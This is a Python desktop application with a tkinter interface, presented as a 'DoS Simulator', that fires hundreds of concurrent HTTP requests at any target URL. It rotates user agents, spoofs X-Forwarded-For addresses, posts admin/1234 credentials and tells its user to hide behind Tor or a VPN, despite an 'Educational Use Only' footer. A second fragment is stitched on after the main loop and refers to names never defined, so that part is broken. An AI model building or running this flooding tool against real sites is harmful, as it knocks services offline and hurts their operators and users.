import threading
import requests
import time
import random
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, scrolledtext

MAX_THREADS = 200
stop_flag = False
threads = []
success_count = 0
fail_count = 0
ssl_fail_count = 0

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 Chrome/83.0.4103.106",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
]

base_headers = [
    {"User-Agent": ua, "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
    for ua in user_agents
]

def send_request(url, delay, i, method, output_box):
    global stop_flag, success_count, fail_count, ssl_fail_count
    if stop_flag:
        return
    now = datetime.now().strftime('%H:%M:%S')
    headers = random.choice(base_headers)
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            data = {'username': 'admin', 'password': '1234'}
            response = requests.post(url, headers=headers, data=data, timeout=10)
        elif method == "HEAD":
            response = requests.head(url, headers=headers, timeout=10)
        elif method == "OPTIONS":
            response = requests.options(url, headers=headers, timeout=10)
        else:
            raise ValueError("Unsupported HTTP method")

        log = f"[{now}] Request {i+1}: ✔️ {method} {response.status_code}"
        success_count += 1

    except requests.exceptions.SSLError:
        log = f"[{now}] Request {i+1}: 🔐 SSL failure"
        ssl_fail_count += 1
    except requests.exceptions.ConnectionError as e:
        if 'RemoteDisconnected' in str(e):
            log = f"[{now}] Request {i+1}: ❌ Server dropped connection"
        else:
            log = f"[{now}] Request {i+1}: ❌ Connection error ({e})"
        fail_count += 1
    except Exception as e:
        log = f"[{now}] Request {i+1}: ❌ Failed ({e})"
        fail_count += 1

    output_box.insert(tk.END, log + "\n")
    output_box.yview(tk.END)
    if delay > 0:
        time.sleep(delay)

def start_attack():
    global stop_flag, threads, success_count, fail_count, ssl_fail_count
    stop_flag = False
    success_count = 0
    fail_count = 0
    ssl_fail_count = 0
    threads = []

    url = url_entry.get()
    method = method_var.get()
    try:
        count = int(count_entry.get())
        delay = float(delay_entry.get())
    except ValueError:
        messagebox.showerror("Input Error", "Please enter valid numbers for count and delay.")
        return

    if not url.startswith("http"):
        messagebox.showerror("URL Error", "URL must start with http or https.")
        return

    output_box.insert(tk.END, f"\n=== Starting CYBER REQ Attack ({method}) on {url} ===\n")
    output_box.yview(tk.END)

    for i in range(count):
        if stop_flag:
            break
        while threading.active_count() > MAX_THREADS:
            time.sleep(0.001)
        thread = threading.Thread(target=send_request, args=(url, delay, i, method, output_box))
        thread.start()
        threads.append(thread)

    monitor_thread = threading.Thread(target=monitor_attack)
    monitor_thread.start()

def stop_attack():
    global stop_flag
    stop_flag = True
    output_box.insert(tk.END, "\n=== Attack Stopped by User ===\n")
    output_box.yview(tk.END)

def monitor_attack():
    global threads
    for t in threads:
        t.join()
    summary = f"\n=== Attack Summary ===\n✔️ Success: {success_count}\n❌ Failed: {fail_count}\n🔐 SSL Failures: {ssl_fail_count}\n====================\n"
    output_box.insert(tk.END, summary)
    output_box.yview(tk.END)

root = tk.Tk()
root.title("CYBER REQ - DoS Simulator")
root.geometry("800x580")
root.configure(bg="#0f0f0f")

title_label = tk.Label(root, text="CYBER REQ - DoS Simulator", font=("Courier", 20, "bold"), fg="#39ff14", bg="#0f0f0f")
title_label.pack(pady=10)

url_frame = tk.Frame(root, bg="#0f0f0f")
url_frame.pack(pady=5)
tk.Label(url_frame, text="Target URL:", fg="white", bg="#0f0f0f").pack(side=tk.LEFT)
url_entry = tk.Entry(url_frame, width=50)
url_entry.pack(side=tk.LEFT, padx=5)

count_frame = tk.Frame(root, bg="#0f0f0f")
count_frame.pack(pady=5)
tk.Label(count_frame, text="Number of Requests:", fg="white", bg="#0f0f0f").pack(side=tk.LEFT)
count_entry = tk.Entry(count_frame, width=10)
count_entry.insert(0, "100")
count_entry.pack(side=tk.LEFT, padx=5)

delay_frame = tk.Frame(root, bg="#0f0f0f")
delay_frame.pack(pady=5)
tk.Label(delay_frame, text="Delay (sec):", fg="white", bg="#0f0f0f").pack(side=tk.LEFT)
delay_entry = tk.Entry(delay_frame, width=10)
delay_entry.insert(0, "0.1")
delay_entry.pack(side=tk.LEFT, padx=5)

method_frame = tk.Frame(root, bg="#0f0f0f")
method_frame.pack(pady=5)
tk.Label(method_frame, text="HTTP Method:", fg="white", bg="#0f0f0f").pack(side=tk.LEFT)
method_var = tk.StringVar(value="GET")
method_menu = tk.OptionMenu(method_frame, method_var, "GET", "POST", "HEAD", "OPTIONS")
method_menu.pack(side=tk.LEFT, padx=5)

proxy_note = tk.Label(root, text="⚠️ Proxy removed. Use Tor or a VPN for anonymity.", fg="orange", bg="#0f0f0f", font=("Courier", 10))
proxy_note.pack(pady=5)

button_frame = tk.Frame(root, bg="#0f0f0f")
button_frame.pack(pady=10)
start_button = tk.Button(button_frame, text="Start Attack", font=("Courier", 12), bg="red", fg="white", command=start_attack)
start_button.pack(side=tk.LEFT, padx=10)
stop_button = tk.Button(button_frame, text="Stop Attack", font=("Courier", 12), bg="gray", fg="white", command=stop_attack)
stop_button.pack(side=tk.LEFT, padx=10)

output_box = scrolledtext.ScrolledText(root, width=100, height=15, bg="black", fg="lime", font=("Courier", 10))
output_box.pack(pady=10)

footer_label = tk.Label(root, text="Built by Yarra Rajkumar | Educational Use Only", fg="gray", bg="#0f0f0f")
footer_label.pack(pady=5)

root.mainloop()
from concurrent.futures import ThreadPoolExecutor, as_completed

def send_request(i, url, method, headers):
    try:
        response = requests.request(method, url, headers=headers, timeout=10)
        return (i, response.status_code)
    except Exception as e:
        return (i, str(e))

# Inside your start_attack or thread logic
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request, i+1, url, method, headers) for i in range(num_requests)]

    for future in as_completed(futures):
        i, result = future.result()
        log_to_gui(f"[{i}] Result: {result}")
